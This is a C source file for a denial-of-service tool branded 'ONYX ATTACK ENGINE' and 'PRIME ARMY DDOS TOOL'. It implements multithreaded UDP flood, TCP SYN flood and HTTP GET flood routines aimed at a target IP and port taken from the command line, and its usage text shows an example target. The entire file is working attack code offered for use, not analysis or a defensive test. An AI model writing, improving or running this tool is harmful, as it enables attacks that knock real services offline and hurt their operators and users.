#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

// ============================================
// 🔥 ONYX ENGINE - FIXED VERSION
// ============================================

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} target_info;

volatile int running = 1;

void timeout_handler(int sig) {
    running = 0;
}

// High-speed packet sender
void *send_udp_packets(void *arg) {
    target_info *target = (target_info *)arg;
    int sock;
    struct sockaddr_in dest;
    char packet[1500];
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        return NULL;
    }
    
    // Set socket options for performance
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    
    // Setup destination
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target->port);
    dest.sin_addr.s_addr = inet_addr(target->ip);
    
    // Random payload
    srand(time(NULL) ^ target->thread_id);
    for (int i = 0; i < sizeof(packet); i++) {
        packet[i] = rand() % 256;
    }
    
    time_t start = time(NULL);
    time_t end = start + target->duration;
    long long packets_sent = 0;
    
    // Attack loop
    while (time(NULL) < end && running) {
        for (int i = 0; i < 100; i++) {  // Batch send
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
            packets_sent++;
        }
        usleep(1);  // Small delay to prevent CPU overload
    }
    
    close(sock);
    printf("[Thread %d] Sent %lld packets\n", target->thread_id, packets_sent);
    return NULL;
}

// TCP SYN attack
void *send_tcp_syn(void *arg) {
    target_info *target = (target_info *)arg;
    int sock;
    struct sockaddr_in dest;
    
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        // If raw socket fails, use UDP
        return send_udp_packets(arg);
    }
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target->port);
    dest.sin_addr.s_addr = inet_addr(target->ip);
    
    char packet[40];  // Minimal TCP SYN packet
    memset(packet, 0, sizeof(packet));
    
    // Simple TCP header
    struct tcphdr *tcp = (struct tcphdr *)packet;
    tcp->source = htons(rand() % 65535);
    tcp->dest = htons(target->port);
    tcp->seq = rand();
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(65535);
    
    time_t end = time(NULL) + target->duration;
    while (time(NULL) < end && running) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
    }
    
    close(sock);
    return NULL;
}

// HTTP Flood (Layer 7)
void *send_http_flood(void *arg) {
    target_info *target = (target_info *)arg;
    int sock;
    struct sockaddr_in dest;
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return NULL;
    }
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target->port);
    dest.sin_addr.s_addr = inet_addr(target->ip);
    
    char request[512];
    snprintf(request, sizeof(request),
        "GET / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", target->ip);
    
    time_t end = time(NULL) + target->duration;
    while (time(NULL) < end && running) {
        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
            send(sock, request, strlen(request), 0);
            close(sock);
        }
        
        // Recreate socket for next connection
        sock = socket(AF_INET, SOCK_STREAM, 0);
    }
    
    close(sock);
    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔═══════════════════════════════════════╗\n");
    printf("║     🔥 ONYX ATTACK ENGINE v2.0 🔥     ║\n");
    printf("║        PRIME ARMY DDOS TOOL           ║\n");
    printf("╚═══════════════════════════════════════╝\n\n");
    
    // Usage: ./sys_lib <ip> <port> <time> [method] [threads]
    if (argc < 4) {
        printf("Usage: %s <ip> <port> <time> [method] [threads]\n", argv[0]);
        printf("\nMethods:\n");
        printf("  1 - UDP Flood (default)\n");
        printf("  2 - TCP SYN Flood\n");
        printf("  3 - HTTP Flood\n");
        printf("\nExample: %s 1.1.1.1 80 60 1 100\n", argv[0]);
        return 1;
    }
    
    // Parse arguments
    target_info target;
    strncpy(target.ip, argv[1], 15);
    target.port = atoi(argv[2]);
    target.duration = atoi(argv[3]);
    
    int method = (argc > 4) ? atoi(argv[4]) : 1;
    int thread_count = (argc > 5) ? atoi(argv[5]) : 100;
    
    // Limit threads
    if (thread_count > 500) thread_count = 500;
    if (thread_count < 1) thread_count = 1;
    
    printf("📍 Target: %s:%d\n", target.ip, target.port);
    printf("⏱️  Duration: %d seconds\n", target.duration);
    printf("🧵 Threads: %d\n", thread_count);
    
    // Select method
    void *(*attack_func)(void *);
    char *method_name;
    
    switch(method) {
        case 2:
            attack_func = send_tcp_syn;
            method_name = "TCP SYN Flood";
            break;
        case 3:
            attack_func = send_http_flood;
            method_name = "HTTP Flood";
            break;
        default:
            attack_func = send_udp_packets;
            method_name = "UDP Flood";
    }
    
    printf("⚡ Method: %s\n", method_name);
    printf("\n🚀 Starting attack...\n\n");
    
    // Set timeout
    signal(SIGALRM, timeout_handler);
    alarm(target.duration + 2);
    
    // Create threads
    pthread_t threads[thread_count];
    target_info thread_targets[thread_count];
    
    for (int i = 0; i < thread_count; i++) {
        thread_targets[i] = target;
        thread_targets[i].thread_id = i;
        pthread_create(&threads[i], NULL, attack_func, &thread_targets[i]);
    }
    
    // Wait for all threads
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n✅ Attack completed on %s:%d\n", target.ip, target.port);
    return 0;
}